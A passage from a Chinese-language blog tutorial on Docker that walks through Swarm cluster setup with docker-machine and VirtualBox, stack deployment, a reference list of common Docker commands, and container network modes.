都会发生变化。从而证明负载均衡成功。</span><br><span class="line"># 对于每个请求，以循环方式选择5个任务中的一个来响应。</span><br><span class="line"># 容器ID与上一个命令（docker container ls -q）的输出匹配。</span><br></pre></td></tr></table></figure><h4 id="关于服务"><a href="#关于服务" class="headerlink" title="关于服务"></a>关于服务</h4><p>在分布式应用程序中，应用程序的不同部分称为“服务”。例如，如果您想象一个视频共享站点，它可能包括一个用于在数据库中存储应用程序数据的服务，一个用户在上传内容后在后台进行视频转码的服务，一个用于前端的服务，等等。</p><p>服务实际上只是“生产中的容器”。服务只运行一个镜像，但它编码了镜像运行的方式 - 它应该使用哪些端口，应该运行多少个容器副本，以便服务具有所需的容量，以及等等。扩展服务会更改运行该软件的容器实例的数量，从而为流程中的服务分配更多计算资源。</p><p>在服务中运行的单个容器称为任务。任务被赋予以数字递增的唯一ID，最多为replicas您定义 的数量docker-compose.yml。</p><p>幸运的是，使用Docker平台定义，运行和扩展服务非常容易 - 只需编写一个docker-compose.yml文件即可。</p><h4 id="如何在Docker上安装-Docker-Machine？"><a href="#如何在Docker上安装-Docker-Machine？" class="headerlink" title="如何在Docker上安装 Docker Machine？"></a>如何在Docker上安装 Docker Machine？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 如果是从<a href="https://hub.docker.com/" target="_blank" rel="noopener"><code>DockerHub</code>官网</a>下载的<code>dmg</code> 安装的Docker，不用担心，<code>Docker-Machine</code> 已经安装好了。</p><h4 id="如何安装VirtualBox？"><a href="#如何安装VirtualBox？" class="headerlink" title="如何安装VirtualBox？"></a>如何安装VirtualBox？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 则需要从<a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener"><code>virtualbox</code>官网</a>下载dmg安装包。</p><p>你可能会遇到一个错误，参考解决：<a href="http://osxdaily.com/2018/12/31/install-run-virtualbox-macos-install-kernel-fails/" target="_blank" rel="noopener">如何在MacOS上安装VirtualBox</a></p><h3 id="了解Swarm集群"><a href="#了解Swarm集群" class="headerlink" title="了解Swarm集群"></a>了解Swarm集群</h3><p>群由多个节点组成，可以是物理或虚拟机。基本概念很简单：运行<code>docker swarm init</code>以启用<code>swarm模式</code>并使当前计算机成为一个<code>swarm管理器</code>。</p><p>这个章节是这个文档系列中学的时间最长的，坑有点多，走了不少弯路，这一节也挺重要的 重点记下笔记。</p><p>在MacOS 下，部分命令需要 sudo 权限。</p><h4 id="创建一个集群（本地计算机的VM）"><a href="#创建一个集群（本地计算机的VM）" class="headerlink" title="创建一个集群（本地计算机的VM）"></a>创建一个集群（本地计算机的VM）</h4><p>在开始这部分之前，需要提前安装好<code>Oracle VirtualBox</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virutalbox myvm1</span><br></pre></td></tr></table></figure><p>如果你收到了这样的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Error with pre-create check: </span><br><span class="line">&quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot;</span><br></pre></td></tr></table></figure><p>说明你的<code>Vritualbox</code>还是没有安装好。</p><p>查看正在运行的VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.104:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.105:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>这样就成功的创建了一台VM，接下来我们要将这台机器作为管理器，第二台作为工作者。</p><p>另外值得一提的是，尽管我在Ubuntu 18.04 上分别安装好了docker-machine、virtualbox，但当我创建 VM 时，总是会提示我计算机没有开启什么虚拟化（BOIS）。</p><p>后来我大概想明白了，可能是我的那台服务器的配置太低了，真的是某个设置项没有启动导致的。</p><p>今天在MacBook 上重新操作了一边，异常顺利。</p><p>记录一个问题：使用<code>docker-machine create --driver virtualbox myvm1</code>创建VM时，创建成功了，但是并不是我想要的实例。得到了以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(default) Creating a new host-only adapter produced an error: hostonlyif create failed:</span><br><span class="line">(default) 0%...</span><br><span class="line">(default) Progress state: E_FAIL</span><br><span class="line">(default) VBoxManage.exe: error: Failed to create the host-only adapter</span><br></pre></td></tr></table></figure><p>找了好久也没有找到答案，最后是怎么解决的呢？重启机器（加上 sudo）。</p><p>启动\停止 VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine start Name</span><br><span class="line">$ docker-machine stop Name</span><br></pre></td></tr></table></figure><h4 id="初始化Swarm-并添加节点"><a href="#初始化Swarm-并添加节点" class="headerlink" title="初始化Swarm 并添加节点"></a>初始化Swarm 并添加节点</h4><p>这里是一个小坑，之前在这里栽了好久。</p><p>这里有两种方式初始化节点或者说操作 VM（推荐第一种）：</p><ol><li><p>ssh 连接VM 实例，在Docker VM Cli 中执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># &lt;myvm1 ip&gt; 指docker-machine ls 对应的 ip</span><br><span class="line"></span><br><span class="line"># 正常会得到这样一个输出</span><br><span class="line">To add a worker to this swarm, run the following command:</span><br><span class="line">   docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式一）"><a href="#将myvm2-实例作为工作者加入（方式一）" class="headerlink" title="将myvm2 实例作为工作者加入（方式一）"></a>将myvm2 实例作为工作者加入（方式一）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure></li><li><p>直接通过 <code>docker-machine ssh myvm1</code> 执行相应命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># 同上</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式二）"><a href="#将myvm2-实例作为工作者加入（方式二）" class="headerlink" title="将myvm2 实例作为工作者加入（方式二）"></a>将myvm2 实例作为工作者加入（方式二）</h4><p>执行上面得到的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm2 &quot; docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377&quot;</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure><p>这样，我们就成功的创建了一个集群，并将一个工作者作为一个节点加入了。</p></li></ol><h5 id="在管理器上查看集群中的节点："><a href="#在管理器上查看集群中的节点：" class="headerlink" title="在管理器上查看集群中的节点："></a>在管理器上查看集群中的节点：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker@myvm1: $ docker node ls</span><br><span class="line">ID                            HOSTNAME     STATUS       AVAILABILITY        MANAGER STATUS</span><br><span class="line">rihwohkh3ph38fhillhhb84sk *   myvm1        Ready        Active              Leader</span><br><span class="line">brtu9urxwfd5j0zrmkubhpkbd     myvm2        Ready        Active</span><br></pre></td></tr></table></figure><p>为什么上面要介绍那两种与 VM 实例进行交互的方式呢？</p><p>因为会和后面的在集群部署应用程序有一定联系。</p><h4 id="在集群中部署应用程序"><a href="#在集群中部署应用程序" class="headerlink" title="在集群中部署应用程序"></a>在集群中部署应用程序</h4><p>在开始部署之前，我们需要了解到有两种方式可以实现。</p><ol><li>docker-machine 为Swarm 管理器配置Shell</li></ol><p>到目前为止，我们与 VM 通信都是通过 <code>docker-machine ssh</code>这种方式，另一种更好的方式就是：将当前shell配置为与VM上的Docker守护程序通信。</p><p>这样我们就可以直接本地的<code>docker-compose.yml</code>文件远程部署应用程序，而无需将其复制到其他任何位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br><span class="line">export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;</span><br><span class="line">export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;</span><br><span class="line">export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;</span><br><span class="line">export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;</span><br><span class="line"># Run this command to configure your shell:</span><br><span class="line"># eval $(docker-machine env myvm1)</span><br><span class="line"></span><br><span class="line"># 运行最后一行命令以配置与之通信的 shell </span><br><span class="line">$ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1)</span><br></pre></td></tr></table></figure><p>运行docker-machine ls 已验证 myvm1 现在是活动的计算机。带有星号（*）表示配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   *        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.100:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.101:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure><ol start="2"><li>传统方式</li></ol><p>传统的方式就是将<code>docker-compose.yml</code>文件拷贝到对应的管理器中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用scp 命令将文件拷贝到 vm 实例中</span><br><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker-machine scp docker-compose.yml myvm1:~</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 这里就可以随意选择使用之前介绍的方式一或者方式二</span><br><span class="line"></span><br><span class="line"># 方式一</span><br><span class="line">$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;</span><br><span class="line"></span><br><span class="line"># 方式二</span><br><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker stack deploy -c docker-compose.yml</span><br></pre></td></tr></table></figure><p>耐心等待一会，就可以看到看到部署成功了。</p><h4 id="访问集群"><a href="#访问集群" class="headerlink" title="访问集群"></a>访问集群</h4><p>在访问集群之前，你需要知道以下两件事：</p><ul><li>访问集群的IP 地址是VM 的IP，使用<code>docker-machine ls</code>查看</li><li>是否存在端口号，取决于你的<code>docker-compose.yml</code>文件</li></ul><h2 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h2><h3 id="容器的生命周期"><a href="#容器的生命周期" class="headerlink" title="容器的生命周期"></a>容器的生命周期</h3><p>创建一个新的容器并运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;</span><br><span class="line"># 解释：Docker以ubuntu15.10镜像创建一个新容器，然后在容器里执行 bin&#x2F;echo &quot;Hello world&quot;，最后输出结果。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -d：让容器在后台运行</span><br><span class="line">* -p：内部容器绑定到指定的主机端口上</span><br><span class="line">* -P：内部容器端口随机映射到主机端口上</span><br><span class="line">* --name：给容器命名，如果不加--name 参数，Docker 会自动命名。</span><br></pre></td></tr></table></figure><p>杀掉一个运行中的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker kill -s KILL mydocker</span><br><span class="line"># mydocker 表示Contianer ID或者Name</span><br></pre></td></tr></table></figure><p>结束停止一个运行中的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container stop mydocker</span><br><span class="line"># mydocker 表示Container ID或者Name</span><br></pre></td></tr></table></figure><p>查看正在运行的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -l：查询最后一次创建容器记录</span><br><span class="line">* --all：查询所有创建容器记录</span><br><span class="line">* -aq：查询所有创建容器的Container ID</span><br></pre></td></tr></table></figure><p>停止Web 应用容器</p><p>这个只是停止该容器的运行，并没有杀死</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop mydocker</span><br></pre></td></tr></table></figure><p>启动Web 应用容器</p><p>已经停止的容器，可以使用命令 docker start 来启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker start mydocker</span><br></pre></td></tr></table></figure><p>移除Web 应用容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm mydocker</span><br><span class="line">mydocker</span><br><span class="line"># 删除容器时，容器必须是停止状态，否者会报错。</span><br></pre></td></tr></table></figure><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3><p>如何创建一个Docker 镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build --tag&#x3D;mydockerapp # 注意：标签名只能小写</span><br></pre></td></tr></table></figure><p>列出下载到计算机中的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest              fce289e99eb9        3 months ago        1.84kB</span><br><span class="line"></span><br><span class="line">各个选项说明:</span><br><span class="line">* REPOSITORY：表示镜像的仓库源</span><br><span class="line">* TAG：镜像的标签</span><br><span class="line">* IMAGE ID：镜像ID</span><br><span class="line">* CREATED：镜像创建时间</span><br><span class="line">* SIZE：镜像大小</span><br></pre></td></tr></table></figure><p>查找镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker search nginx </span><br><span class="line">NAME     DESCRIPTION                    STARS      OFFICIAL </span><br><span class="line">nginx    Official build of Nginx.       11154        [OK]</span><br><span class="line"></span><br><span class="line">NAME:镜像仓库源的名称</span><br><span class="line"></span><br><span class="line">DESCRIPTION:镜像的描述</span><br><span class="line"></span><br><span class="line">OFFICIAL:是否docker官方发布</span><br></pre></td></tr></table></figure><p>获取一个新镜像</p><p>如果我们决定使用上图中的 nginx 官方镜像，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull nginx</span><br></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><p>列出下载到计算机中的 container </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br></pre></td></tr></table></figure><h3 id="仓库操作"><a href="#仓库操作" class="headerlink" title="仓库操作"></a>仓库操作</h3><p>登入<code>hub.docker.com</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker login </span><br><span class="line"># 前提是先注册号账号</span><br></pre></td></tr></table></figure><p>标记镜像，以便上传至目标位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker tag mydocker aikang&#x2F;get-started:part1</span><br><span class="line"># 最后上传至所登入的Docker Hub仓库</span><br></pre></td></tr></table></figure><p>将标记的镜像上传到存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker push mydocker aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure><p>从远程存储库中拉出并运行映像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure><p>注意：无论在哪里执行<code>docker run</code>，它都会提取你的镜像，以及Python和所有依赖项requirements.txt，并运行你的代码。它们都在一个整洁的小包中一起旅行，你不需要在主机上安装任何东西让Docker运行它。</p><h3 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a>服务操作</h3><p>群集初始化，可以使节点变成群集管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br></pre></td></tr></table></figure><p>以服务运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line">Creating network getstartedlab_webnet</span><br><span class="line">Creating service getstartedlab_web</span><br><span class="line"># 需要有一个docker-compose.yml 文件</span><br></pre></td></tr></table></figure><p>列出与应用程序关联的正在运行的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ls</span><br></pre></td></tr></table></figure><p>查看与堆栈相关的所有服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack services getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>列出服务任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ps getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>关闭服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack rm getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>查看集群中的节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node ls</span><br></pre></td></tr></table></figure><h3 id="VM-交互"><a href="#VM-交互" class="headerlink" title="VM 交互"></a>VM 交互</h3><p>创建一个VM 实例（Win、Mac、Linux）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virtualbox myvm1</span><br></pre></td></tr></table></figure><p>使用ssh 连接VM 实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br></pre></td></tr></table></figure><p>查看关于节点的基本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br></pre></td></tr></table></figure><p>使用scp命令将本地文件copy到VM实例中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine scp &lt;filename&gt; myvm1:~  </span><br><span class="line"># 从当前目录拷贝到实例中的根目录下</span><br></pre></td></tr></table></figure><p>删除指定VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine rm myvm1</span><br></pre></td></tr></table></figure><p>将Shell 与VM 连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env myvm1)</span><br></pre></td></tr></table></figure><p>将Shell 与VM 断开，使用本地连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env -u)</span><br></pre></td></tr></table></figure><h3 id="集群操作"><a href="#集群操作" class="headerlink" title="集群操作"></a>集群操作</h3><p>以下操作均需要在VM CLI 中运行</p><p>初始化集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init --advertise-addr &lt;myvm1 ip&gt;</span><br></pre></td></tr></table></figure><p>将节点加入集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot;</span><br></pre></td></tr></table></figure><p>让工作者离开集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave</span><br></pre></td></tr></table></figure><p>强制离开并关掉集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave -f</span><br></pre></td></tr></table></figure><p>查看该节点的详情信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node inspect &lt;node ID&gt;</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c &lt;file&gt; &lt;app&gt;</span><br></pre></td></tr></table></figure><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>查看Docker版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker version</span><br></pre></td></tr></table></figure><p>显示Docker系统信息，包括镜像和容器数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker info</span><br></pre></td></tr></table></figure><p>查看Docker 容器的配置和状态信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker inspect mydocker</span><br><span class="line"># 表示容器的Container ID 或者Names</span><br></pre></td></tr></table></figure><p>查看指定容器映射到宿主机的端口号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker port mydocker</span><br><span class="line">80&#x2F;tcp -&gt; 0.0.0.0:4000</span><br><span class="line"># mydocker 表示该应用的Container ID 或者Names</span><br></pre></td></tr></table></figure><p>查看Web 应用程序日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs -f mydocker </span><br><span class="line"> * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line"># mydocker 表示该应用的Container ID 或者是Names</span><br></pre></td></tr></table></figure><p>查看Web 应用程序容器的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker top mydocker </span><br><span class="line"># </span><br><span class="line">UID        PID       PPID        C     STIME        TTY         TIME                CMD</span><br><span class="line">root      22358      22323       0     20:58        ?      00:00:00            python app.py</span><br></pre></td></tr></table></figure><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="容器有哪些网络模式"><a href="#容器有哪些网络模式" class="headerlink" title="容器有哪些网络模式"></a>容器有哪些网络模式</h3><h5 id="1-None"><a href="#1-None" class="headerlink" title="1. None"></a>1. None</h5><p>在该模式下容器没有对外网络，本地机只有一个回路地址</p><h5 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h5><p>在该模式下，与另一个容器共享网络</p><h5 id="3-Host"><a href="#3-Host" class="headerlink" title="3. Host"></a>3. Host</h5><p>在该模式下，与主机共享网络</p><h5 id="4-Bridge"><a href="#4-Bridge" class="headerlink" title="4. Bridge"></a>4. Bridge</h5><p>该模式为Docker 默认的网络模式，在这种模式下，Docker 容器与外部的通信都是通过 iptable 实现的。</p><h5 id="5-Overlay"><a href="#5-Overlay" class="headerlink" title="5. Overlay"></a>5. Overlay</h5><p>该模式为Docker 目前原生的跨主机多子网模型，主要是通过 vxlan 技术实现。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">Docker 入门教程 - 阮一峰网络日志</a></li><li><a href="wiki.jikexueyuan.com/project/docker-technology-and-combat">Docker 入门 - 极客学院</a></li><li><a href="https://docs.docker.com/install/" target="_blank" rel="noopener">安装Docker ce - 官方文档</a></li><li><a href="http://www.ityouknow.com/docker/2018/04/19/docker-swarm.html" target="_blank" rel="noopener">Docker Swarm 入门教程</a></li><li><a 